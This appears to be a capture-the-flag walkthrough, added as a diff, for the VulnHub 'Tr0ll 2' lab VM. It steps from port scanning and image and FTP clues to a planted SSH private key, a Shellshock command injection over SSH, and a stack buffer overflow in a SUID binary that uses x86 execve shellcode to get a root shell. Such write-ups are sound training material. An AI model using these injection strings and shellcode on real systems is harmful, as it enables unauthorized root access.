@@ -1,0 +1,662 @@
+URL : https://www.vulnhub.com/entry/tr0ll-2,107/
+
+1.) Identify the IP address of Tr0ll machine
+root@kali:~# netdiscover
+ Currently scanning: 192.168.43.0/16   |   Screen View: Unique Hosts
+
+ 7 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 420
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor
+ -----------------------------------------------------------------------------
+ 192.168.0.1     c4:a8:1d:2e:2d:1c    01    060   Unknown vendor
+ 192.168.0.4     08:d4:0c:22:5c:ea    02    120   Unknown vendor
+ 192.168.0.8     00:0c:29:bf:89:9c    01    060   VMware, Inc.
+ 192.168.0.2     dc:3e:f8:eb:e8:f4    01    060   Unknown vendor
+ 192.168.0.5     3c:91:57:12:05:73    01    060   Unknown vendor
+ 192.168.0.6     bc:77:37:17:0e:03    01    060   Unknown vendor
+
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.0.8
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-20 03:05 PDT
+Nmap scan report for 192.168.0.8
+Host is up (0.00076s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
+|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
+|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 00:0C:29:BF:89:9C (VMware)
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10
+Network Distance: 1 hop
+Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.76 ms 192.168.0.8
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.87 seconds
+
+3.) Connect to HTTP server on port 80
+http://192.168.0.8/
+Page source doesn't reveal anything
+
+4.) Check "robots.txt"
+http://192.168.0.8/robots.txt
+
+User-agent:*
+Disallow:
+/noob
+/nope
+/try_harder
+/keep_trying
+/isnt_this_annoying
+/nothing_here
+/404
+/LOL_at_the_last_one
+/trolling_is_fun
+/zomg_is_this_it
+/you_found_me
+/I_know_this_sucks
+/You_could_give_up
+/dont_bother
+/will_it_ever_end
+/I_hope_you_scripted_this
+/ok_this_is_it
+/stop_whining
+/why_are_you_still_looking
+/just_quit
+/seriously_stop
+
+5.) Try accessing all the folders from the robots.txt page
+Only 4 folders have images
+/noob 
+/keep_trying 
+/dont_bother 
+/ok_this_is_it
+Save those images
+
+6.) Check the file size of different images
+root@kali:~/Images# wc dont_bother.jpg
+   63   369 15873 dont_bother.jpg
+root@kali:~/Images# wc keep_trying.jpg
+   62   363 15831 keep_trying.jpg
+root@kali:~/Images# wc noob.jpg
+   62   363 15831 noob.jpg
+root@kali:~/Images# wc ok_this_is_it.jpg
+   62   363 15831 ok_this_is_it.jpg
+So "dont_bother.jpg" is bigger than other files.
+
+7.) Run strings on the "dont_bother.jpg" file.
+root@kali:~/Images# strings dont_bother.jpg
+JFIF
+#3-652-108?QE8<M=01F`GMTV[\[7DcjcXjQY[W
+)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+"aq2
+\vRH
+sdwTi
+ aDP
+ aDP
+\z!$
+`aDc
+(Q@0S
+}}HQ\)
+B6F@
+T"8V
+!\#(
+u6.U
+6&      QY
+;.e{
+hH}Q
+=\x#uk
+?}1,;Gd
+~>znk
+BP~9D
+QFQHQT
+D       vOE
+{"yw
+.&9)
+Km3Q
+^Ah9]*
+%DGU
+WUh
+:uWw
+ALzO#
+NO_`
+F wT
+s$3'
+H=ev
+0mwP
+J,hi
+nuMs[~
+XSy}]F
+Q{w}n=
+{k{]&
+Y]3P
+D&ai
+7+}(
+jr'h
+)0zZ
+L!&\~T
+`$3!
+8]j,
+K:/w.`'
+~^GR
+5zT)T
+Rq<8
+_mzN
+S0=&
+o&"8
+;H!\M.
+.l|(
+fC@FO
+8Yj5
+f        &1
+Cdb>
+1<,n=
+Ksbv
+K       AM
+j?w1
+(669VNR
+u%u|Pl
+;Cw4d
+Ps<o
+rP{J
+H!u-
+Vcw9
+)Qup=-kG+
+$T3!k:~
+;*iZ
+wvwD
+">8Z
+mcc8=
+IQTu
+@rh8T
++sx(
+kK+:
+=GEZ
+gugI
+}wR.
+-.u+
+Dm3Q
++}[R
+iZ{4
+Xn_B
+OYKH
+8Hq%
+ t+%s3
+o=
+<CgiZ
+jnavF
+]mb*=
+N9Z<+
+kF.j
+$v_I
+BI%z
+2\7c
+:t@n~@
+        .qtI
+$pGd
+8VVz
+nQ~4
+j--h
+8WSs
+@QEw^?
+nwyA
+aQ3O
+XBuJm08\&
+"PzJz
+>%cwJ
+t+7>
+'h(:
+]O7U
+ew\\
+0>!-
+1=xA0A
+A+eW
+H `q
+B1Ow
+~Q4awpX=
+0J<n
+v&8Y
+Z8$.
+yS-[
+2 -,
+e6mh
+{D c
+Il-FkKv
+i{j68
+XL{#
+*Mqhq
+O\ +
+Sk~B
+[jmdR
+Ol;I
+'%jq
+iZ7%
+Po.d
+I {-G>
+        ^ah
+{)V,
+8]-#
+g<.}
+'o&Q
+4F8Q
+        -wC
+ F>J
+_mg=
+i{&0
+1ancNpG*
+=VZ[MH
+hZOtY
+'=!)
+Bwgq
+Ws_4\2{.M
+&yC*
+;,?     @
+g%t.
+).eG`
+:q+|
+tA{vF
+_R4+
+V'E[
+XKwyDOt
+f>U_
+6 ;+5
+q/2~WB
+Xi]5
+tT]+_
+kTm6
+0W;u
++cih
+Qhcv
+`*0G
+nD{-4/
+pzw\
+GkDu(
+FprFAF@
+2;.uG
++=\k
+UN"1
+khTvH
+Q}Jm
+ee->
+k!;Z
+ivc2
+ZMV0
+-wI<
+nCO%?C
+.<vI
+QLON
+@Si;X'
+f02HP
+8Jh;
+gYCJ
+pV}A
+7U      4
+]=%em;
+lj\p
+*/ p?E$
+Look Deep within y0ur_self for the answer
+
+8.) Last line of the strings command states "Look Deep within y0ur_self for the answer"
+http://192.168.0.8/y0ur_self/
+There lies a file "answer.txt" in the directory
+Download the file
+
+9.) The contents of "answer.txt" seem to be encoded in base64
+Decode the contents of answer.txt file and sort by line length
+root@kali:~# base64 -d answer.txt > answer-decoded.txt && awk '{print length, $0;}' answer-decoded.txt | sort -nr | less
+30 ItCantReallyBeThisEasyRightLOL
+22 electroencephalographs
+22 counterrevolutionaries
+21 electroencephalograph
+21 electroencephalograph
+21 electroencephalograms
+20 uncharacteristically
+20 electroencephalogram
+20 electroencephalogram
+20 counterrevolutionary
+20 counterrevolutionary
+20 Andrianampoinimerina
+20 Andrianampoinimerina
+19 oversimplifications
+19 nonrepresentational
+19 interdenominational
+19 electrocardiographs
+19 counterintelligence
+19 counterintelligence
+19 chlorofluorocarbons
+18 ultraconservatives
+18 transubstantiation
+18 transubstantiation
+18 transcendentalists
+18 telecommunications
+18 telecommunications
+18 oversimplification
+18 oversimplification
+18 misrepresentations
+18 misinterpretations
+18 interrelationships
+
+10.) Try to connect to the ftp server using the below credentials
+Username : Tr0ll
+Password : Tr0ll
+root@kali:~# ftp 192.168.0.8
+Connected to 192.168.0.8.
+220 Welcome to Tr0ll FTP... Only noobs stay for a while...
+Name (192.168.0.8:root): Tr0ll
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
+226 Directory send OK.
+ftp> get lmao.zip
+local: lmao.zip remote: lmao.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
+226 Transfer complete.
+1474 bytes received in 0.00 secs (395.8 kB/s)
+ftp> exit
+221 Goodbye.
+
+11.) Unzip the lmao.zip file
+root@kali:~# unzip lmao.zip
+Archive:  lmao.zip
+[lmao.zip] noob password:
+
+12.) Now try the password "ItCantReallyBeThisEasyRightLOL" from the file which is the word with the highest length.
+root@kali:~# unzip lmao.zip
+Archive:  lmao.zip
+[lmao.zip] noob password:
+  inflating: noob
+root@kali:~# ls
+answer2.txt  answer-decoded.txt  answer.txt  Desktop  Images  lmao.zip  noob  wer-decoded.txt
+
+13.) An new file has been created with the name "noob". Look into the contents of the file.
+root@kali:~# cat noob
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
+yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
+/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
+q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
+z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
+e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
+u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
+gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
+UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
+La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
+xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
+aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
+K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
+n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
+TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
+WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
+ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
+0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
+vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
+ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
+th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
+G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
+q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
+vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
+zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
+-----END RSA PRIVATE KEY-----
+
+14.) Now try to login into the server using the private key
+root@kali:~# ssh noob@192.168.0.8 -i noob
+TRY HARDER LOL!
+Connection to 192.168.0.8 closed.
+root@kali:~#
+The connection is forcefully closed
+
+15.) Login into the SSH server using verbose mode
+root@kali:~# ssh noob@192.168.0.8 -i noob -v
+OpenSSH_6.0p1 Debian-4+deb7u2, OpenSSL 1.0.1e 11 Feb 2013
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: Applying options for *
+debug1: Connecting to 192.168.0.8 [192.168.0.8] port 22.
+debug1: Connection established.
+debug1: permanently_set_uid: 0/0
+debug1: identity file noob type -1
+debug1: identity file noob-cert type -1
+debug1: Remote protocol version 2.0, remote software version OpenSSH_5.9p1 Debian-5ubuntu1.4
+debug1: match: OpenSSH_5.9p1 Debian-5ubuntu1.4 pat OpenSSH_5*
+debug1: Enabling compatibility mode for protocol 2.0
+debug1: Local version string SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: server->client aes128-ctr hmac-md5 none
+debug1: kex: client->server aes128-ctr hmac-md5 none
+debug1: sending SSH2_MSG_KEX_ECDH_INIT
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: Server host key: ECDSA 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96
+debug1: Host '192.168.0.8' is known and matches the ECDSA host key.
+debug1: Found key in /root/.ssh/known_hosts:3
+debug1: ssh_ecdsa_verify: signature correct
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: Roaming not allowed by server
+debug1: SSH2_MSG_SERVICE_REQUEST sent
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: publickey
+debug1: Trying private key: noob
+debug1: read PEM private key done: type RSA
+debug1: Authentication succeeded (publickey).
+Authenticated to 192.168.0.8 ([192.168.0.8]:22).
+debug1: channel 0: new [client-session]
+debug1: Requesting no-more-sessions@openssh.com
+debug1: Entering interactive session.
+debug1: Remote: Forced command.
+debug1: Sending environment.
+debug1: Sending env LANG = en_US.UTF-8
+debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
+TRY HARDER LOL!
+debug1: channel 0: free: client-session, nchannels 1
+Connection to 192.168.0.8 closed.
+Transferred: sent 2632, received 1712 bytes, in 0.0 seconds
+Bytes per second: sent 53092.3, received 34534.2
+debug1: Exit status 0
+
+The SSH service is vulnerable to Shellshock
+http://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh
+http://bloggars-online.blogspot.ca/2014/10/bash-shellshock-ssh-exploit.html
+
+16.) Confirm the vulnerability
+root@kali:~# ssh noob@192.168.0.8 -i noob  '() { :;}; uname -a'
+Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
+
+root@kali:~# ssh noob@192.168.0.8 -i noob  '() { :;}; cat .bash_history'
+./bof
+./bof @@@@@@@@@@@@
+gdb bof
+rm bof
+ls -al
+rm .bash_history
+su root
+
+17.) Look around to search for interesting stuff
+root@kali:~# ssh noob@192.168.0.8 -i noob -t "() { :; }; /bin/bash"
+noob@Tr0ll2:~$ ls
+noob@Tr0ll2:~$ cd /
+noob@Tr0ll2:/$ ls
+bin  boot  dev  etc  home  initrd.img  lib  lost+found  media  mnt  nothing_to_see_here  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var  vmlinuz
+noob@Tr0ll2:/$ cd nothing_to_see_here/
+noob@Tr0ll2:/nothing_to_see_here$ ls
+choose_wisely
+noob@Tr0ll2:/nothing_to_see_here$ cd choose_wisely/
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls
+door1  door2  door3
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
+door1:
+total 16
+drwsr-xr-x 2 root root 4096 Oct  4  2014 .
+drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t
+
+door2:
+total 20
+drwsr-xr-x 2 root root 4096 Oct  5  2014 .
+drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t
+
+door3:
+total 16
+drwsr-xr-x 2 root root 4096 Oct  5  2014 .
+drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$
+
+There are 3 binaries with the sticky bit set. Use them for privilage escalation.
+
+18.) The 3 r00t binaries keep switching places 
+-> One of them reboots the VM
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t
+Good job, stand by, executing root shell...
+BUHAHAHA NOOB!
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
+Broadcast message from noob@Tr0ll2
+        (/dev/pts/0) at 23:21 ...
+
+The system is going down for reboot NOW!
+Connection to 192.168.0.8 closed by remote host.
+Connection to 192.168.0.8 closed.
+-> Other one puts you in a restricted shell for a limited period of time
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
+
+2 MINUTE HARD MODE LOL
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ cd ..
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ cd door2/
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ls
+bash: /bin/ls: Permission denied
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ls
+bash: /bin/ls: Permission denied
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ cd ..
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ cd door3/
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ls
+bash: /bin/ls: Permission denied
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
+-> Third one is the useful one which we have to use. This one is the biggest one of the lot.
+Run the binary to see what happens
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ls
+r00t
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t
+Usage: ./r00t input
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t AAAAAAAAAAAAAA
+AAAAAAAAAAAAAAnoob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 400')
+Segmentation fault
+The binary is vulnerable to buffer overflow
+
+19.) Use "pattern_create.rb" to find out the location of EIP
+root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 400
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
+
+20.) Run the binary in GBD as it is installed on the Tr0ll machine using the pattern created previously
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ gdb r00t
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /nothing_to_see_here/choose_wisely/door2/r00t...done.
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
+Starting program: /nothing_to_see_here/choose_wisely/door2/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6a413969 in ?? ()
+(gdb)
+
+21.) Search for the location of EIP
+root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 6a413969
+[*] Exact match at offset 268
+So now we can colcude that we have to overwrite the first 268 bytes to reach EIP
+
+22.) Check to see if EIP is our control
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ gdb r00t
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /nothing_to_see_here/choose_wisely/door2/r00t...done.
+(gdb) r $(python -c 'print "A" * 268 + "B" * 4')
+Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "B" * 4')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) i r
+eax            0x110    272
+ecx            0x0      0
+edx            0x0      0
+ebx            0xb7fd1ff4       -1208147980
+esp            0xbffffb80       0xbffffb80
+ebp            0x41414141       0x41414141
+esi            0x0      0
+edi            0x0      0
+eip            0x42424242       0x42424242
+eflags         0x210286 [ PF SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb)
+EIP is in our control as EIP has been written with B's
+Now we also know the address of ESP "0xbffffb780"
+
+23.) Now we know that 268 bytes take us to EIP
+Replace EIP with the 4 byte value of the ESP
+Add some NOPs to make the exploit more reliable
+In the end add the shell code of our choosing (http://shell-storm.org/shellcode/files/shellcode-841.php)
+Final exploit look like this
+./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+
+24.) Now run the above exploit and get the flag
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ du -h
+16K     ./door2
+12K     ./door3
+12K     ./door1
+44K     .
+
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+# whoami
+root
+# pwd
+/nothing_to_see_here/choose_wisely/door3
+# cat /root/Proof.txt
+You win this time young Jedi...
+
+a70354f0258dcc00292c72aab3c8b1e4
+#
+
+Note : 
+GDB drops the privilages when the file is marked with SUID.
+So run the exploit outside GDB in order to spawn a privilaged shell
